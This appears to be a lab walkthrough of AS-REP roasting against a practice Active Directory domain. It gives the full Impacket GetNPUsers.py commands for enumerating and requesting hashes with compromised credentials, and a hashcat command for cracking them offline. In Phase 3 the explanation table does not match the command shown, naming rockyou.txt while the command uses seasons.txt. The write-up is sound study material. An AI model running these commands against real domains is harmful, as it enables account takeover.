## Phase 1 — Recon: finding AS-REP-roastable accounts

With `jcarter`'s credentials already in hand from the earlier compromise, the
next step is finding out which domain accounts are vulnerable to AS-REP
roasting — specifically, any account with Kerberos pre-authentication
disabled. Rather than guessing usernames, authenticated LDAP enumeration can
pull this list directly from Active Directory.

Locate the directory 

<img width="228" height="30" alt="image" src="https://github.com/user-attachments/assets/f6424c54-442b-4a22-8d0f-89d118cdf6d7" />

```
GetNPUsers.py lab.local/jcarter:<JCARTER_PASSWORD> -dc-ip 10.0.30.10
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `GetNPUsers.py` | Impacket tool that queries AD for accounts with the `DONT_REQ_PREAUTH` flag set, and can optionally request AS-REP hashes for them |
| `lab.local/jcarter:<JCARTER_PASSWORD>` | Authenticates the LDAP query as `jcarter` — domain/username:password syntax |
| `-dc-ip 10.0.30.10` | Points the tool at the domain controller to query, since DNS resolution isn't assumed from the ATTACKER VLAN |

</details>

This returned no file/ directory:

<img width="293" height="34" alt="image" src="https://github.com/user-attachments/assets/0709d26e-3fd0-48e2-91e4-11a6ed1c1ed7" />

So I ran a different command: 

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.local/jcarter:ActualPasswordHere -dc-ip 10.0.30.10
```
Got what I was looking for:

<img width="478" height="66" alt="image" src="https://github.com/user-attachments/assets/bde802b7-9f21-4735-a722-96638fbdd85e" />

## Phase 2 — Requesting the AS-REP hash

With `svc-backup` confirmed as vulnerable, the next step is requesting its
actual AS-REP ticket. Because the account has preauthentication disabled, this
can be requested **without knowing svc-backup's password at all** — the KDC
will respond with an AS-REP encrypted using a key derived from svc-backup's
own password hash, which can then be cracked offline.

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.local/jcarter:<JCARTER_PASSWORD> -dc-ip 10.0.30.10 -request -outputfile asrep_hashes.txt
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `-request` | Tells the tool to actually perform the AS-REQ/AS-REP exchange for every vulnerable account found, not just list them |
| `-outputfile asrep_hashes.txt` | Saves the resulting crackable hash(es) to a local file in Hashcat-compatible format |

</details>

<img width="685" height="123" alt="image" src="https://github.com/user-attachments/assets/2a16e247-0e9b-4337-a480-cc87d715e385" />

## Phase 3 — Cracking the AS-REP hash offline

The captured AS-REP hash is encrypted with a key derived from `svc-backup`'s
password — meaning it can be cracked completely offline, with no further
interaction with the domain controller and no additional logon events
generated. This is the real danger of AS-REP roasting: once the hash is in
hand, the rest of the attack is invisible to the network.

```
hashcat -m 18200 -a 6 asrep_hashes.txt seasons.txt ?d?d?d?d?s?s
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `hashcat` | Offline password-cracking tool |
| `-m 18200` | Selects the "Kerberos 5, etype 23, AS-REP" hash mode — the specific format Impacket's `GetNPUsers.py` outputs |
| `asrep_hashes.txt` | The captured hash file from Phase 2 |
| `/usr/share/wordlists/rockyou.txt` | A common password wordlist used for dictionary-based cracking |

</details>

<img width="689" height="244" alt="image" src="https://github.com/user-attachments/assets/dca0c081-4aeb-47b8-897f-b36b5b7b2c10" />


